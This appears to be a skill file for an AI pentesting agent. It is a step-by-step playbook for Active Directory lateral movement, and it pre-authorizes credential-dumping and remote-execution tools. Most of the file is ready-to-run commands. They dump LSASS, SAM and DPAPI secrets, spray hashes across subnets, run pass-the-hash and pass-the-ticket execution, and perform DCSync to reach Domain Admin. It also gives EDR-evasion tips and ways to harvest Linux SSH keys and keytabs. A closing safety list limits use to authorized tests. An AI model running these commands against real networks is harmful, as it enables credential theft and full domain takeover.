---
name: hunt-lateral-movement
description: >
  Lateral movement techniques in AD: Pass-the-
  Hash, Pass-the-Ticket, overpass-the-hash,
  DCOM, WinRM, PSExec, SMB, WMI, RDP hijack,
  SSH key reuse, credential dumping from
  memory and registry. Refined 0 times.
allowed_tools:
  - Bash(crackmapexec:*, netexec:*, psexec*:*,
    wmiexec*:*, smbexec*:*, atexec*:*, dcomexec*:*,
    evil-winrm*:*, secretsdump*:*, reg:*,
    mimikatz*:*, pypykatz*:*, lsassy*:*, nmap:*)
  - Read
  - Grep
  - Glob
  - WebSearch
when_to_use: >
  After initial foothold, need to move to
  other machines. Triggers: "lateral movement",
  "pass the hash", "PtH", "pass the ticket",
  "pivot", "move laterally", "jump to",
  "PSExec", "WMI exec", "DCOM", "WinRM",
  "dump credentials", "LSASS"
argument-hint: "[DOMAIN/user:password or hash TARGET_IP]"
---

# Hunt: Lateral Movement

## Success Rate
- Times used: 0
- Vulns found: 0
- Last refined: N/A
- Avg severity: High-Critical
- Avg bounty: $5,000 - $20,000

## Goal
Move from compromised machine to other
machines in the domain, collecting
credentials and escalating access toward
Domain Admin.

## Technique

### Step 1: Credential Harvesting
```bash
# LSASS dump (local admin required)
# Remote via lsassy
lsassy -u admin -p password TARGET_IP
lsassy -u admin -H NTLM_HASH TARGET_IP

# Remote via crackmapexec
crackmapexec smb TARGET_IP \
  -u admin -p password --lsa
crackmapexec smb TARGET_IP \
  -u admin -p password --sam
crackmapexec smb TARGET_IP \
  -u admin -p password -M lsassy

# Impacket secretsdump (remote registry)
secretsdump.py DOMAIN/admin:password@TARGET_IP
secretsdump.py DOMAIN/admin@TARGET_IP \
  -hashes :NTLM_HASH

# Extract from registry hives
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
secretsdump.py -sam sam.save \
  -system system.save -security security.save LOCAL

# DPAPI secrets (Chrome passwords, Wi-Fi, etc.)
dpapi.py backupkeys \
  -t DOMAIN/admin:password@DC_IP
dpapi.py credential \
  -file credential_file -key DPAPI_KEY
```

**Success criteria**: Credentials (plaintext,
NTLM hashes, or Kerberos tickets) from
compromised host.

**Artifacts**: Credential list (user:hash).

### Step 2: Identify Lateral Targets
```bash
# Scan for admin access with current creds
crackmapexec smb SUBNET/24 \
  -u admin -p password
crackmapexec smb SUBNET/24 \
  -u admin -H NTLM_HASH

# Check for specific services
crackmapexec winrm SUBNET/24 \
  -u admin -p password
crackmapexec smb SUBNET/24 \
  -u admin -p password --shares

# Find machines where DA logged in
# (BloodHound: "Sessions" data)
# Or via crackmapexec loggedon users
crackmapexec smb SUBNET/24 \
  -u admin -p password --loggedon-users

# Priority targets: machines where DA
# has active session → dump creds → DA
```

**Success criteria**: List of machines
where current credentials give admin access.
Identify DA session targets.

### Step 3: Execute Lateral Movement

**Pass-the-Hash (PtH)**:
```bash
# SMBExec
smbexec.py DOMAIN/admin@TARGET_IP \
  -hashes :NTLM_HASH

# WMIExec
wmiexec.py DOMAIN/admin@TARGET_IP \
  -hashes :NTLM_HASH

# PSExec
psexec.py DOMAIN/admin@TARGET_IP \
  -hashes :NTLM_HASH

# CrackMapExec
crackmapexec smb TARGET_IP \
  -u admin -H NTLM_HASH -x "whoami"
```

**Pass-the-Ticket (PtT)**:
```bash
# Export ticket
export KRB5CCNAME=admin.ccache

# Use with any Impacket tool
psexec.py -k -no-pass \
  DOMAIN/admin@target.domain.local
wmiexec.py -k -no-pass \
  DOMAIN/admin@target.domain.local
secretsdump.py -k -no-pass \
  DOMAIN/admin@target.domain.local
```

**Overpass-the-Hash (OPTH)**:
```bash
# Get TGT from NTLM hash
getTGT.py DOMAIN/admin -hashes :NTLM_HASH
export KRB5CCNAME=admin.ccache

# Use TGT for Kerberos auth
psexec.py -k -no-pass \
  DOMAIN/admin@target.domain.local
```

**DCOM Execution**:
```bash
dcomexec.py DOMAIN/admin:password@TARGET_IP
dcomexec.py DOMAIN/admin@TARGET_IP \
  -hashes :NTLM_HASH \
  -object MMC20
```

**WinRM**:
```bash
evil-winrm -i TARGET_IP \
  -u admin -p password

evil-winrm -i TARGET_IP \
  -u admin -H NTLM_HASH
```

**ATExec (Scheduled Task)**:
```bash
atexec.py DOMAIN/admin:password@TARGET_IP \
  "whoami"
atexec.py DOMAIN/admin@TARGET_IP \
  -hashes :NTLM_HASH "whoami"
```

**Success criteria**: Command execution
on target machine.

### Step 4: Harvest and Repeat
```bash
# On each new machine:

# 1. Dump credentials
secretsdump.py DOMAIN/admin@NEW_TARGET \
  -hashes :NTLM_HASH

# 2. Check for DA sessions
crackmapexec smb NEW_TARGET \
  -u admin -H NTLM_HASH --loggedon-users

# 3. If DA session found → dump LSASS
lsassy -u admin -H NTLM_HASH NEW_TARGET

# 4. Use DA credentials → DCSync
secretsdump.py DOMAIN/da_user@DC_IP \
  -hashes :DA_HASH -just-dc-ntlm

# Repeat until DA achieved
```

**Success criteria**: Chain of lateral
movement until Domain Admin creds obtained.

### Step 5: Linux Lateral Movement
```bash
# SSH key reuse (found on compromised host)
find / -name "id_rsa" -o -name "id_ed25519" \
  2>/dev/null
ssh -i found_key user@LINUX_TARGET

# Credential files
find / -name "*.conf" -exec \
  grep -l "password" {} \; 2>/dev/null
cat /home/*/.bash_history | grep -i "ssh\|pass"

# Kerberos on Linux (keytab files)
find / -name "*.keytab" 2>/dev/null
klist -k /etc/krb5.keytab
kinit -k -t /etc/krb5.keytab host/machine$

# SSSD cache (AD-joined Linux)
tdbdump /var/lib/sss/db/cache_domain.ldb
```

**Success criteria**: Access to additional
Linux machines in the domain.

## Patterns That Work

| Pattern | Context | Confidence |
|---------|---------|------------|
| PtH with DA hash | NTLM hash obtained | 10 |
| DA session on workstation | Dump LSASS → DA creds | 9 |
| SSH key reuse (Linux) | Keys without passphrase | 9 |
| Shared local admin password | Same password everywhere | 9 |
| Service account on multiple hosts | Over-privileged svc | 8 |
| Cached credentials (mscash2) | DA logged in before | 7 |

## False Positive Filters
- Credential Guard enabled: LSASS protected,
  NTLM hashes not in memory → PtH blocked →
  use Kerberos-based methods (PtT, OPTH)
- Protected Users group: no NTLM, no delegation,
  no caching → different approach needed
- LAPS enabled: local admin password unique
  per machine → local admin PtH doesn't spread
- Network segmentation: VLANs may block
  lateral movement → check network access
- EDR: may detect LSASS access, PSExec,
  named pipes → use stealthier methods
  (WMI, DCOM, WinRM)

## Safety Rails
- Authorized pentest engagement only
- Don't dump credentials from production
  systems without explicit approval
- Use safe commands for proof (whoami, hostname)
- Don't install persistent backdoors
- Clean up scheduled tasks after ATExec
- Document every machine accessed

## Changelog
- Initial creation: PtH, PtT, OPTH, DCOM,
  WinRM, PSExec, ATExec, credential dumping,
  Linux lateral movement techniques
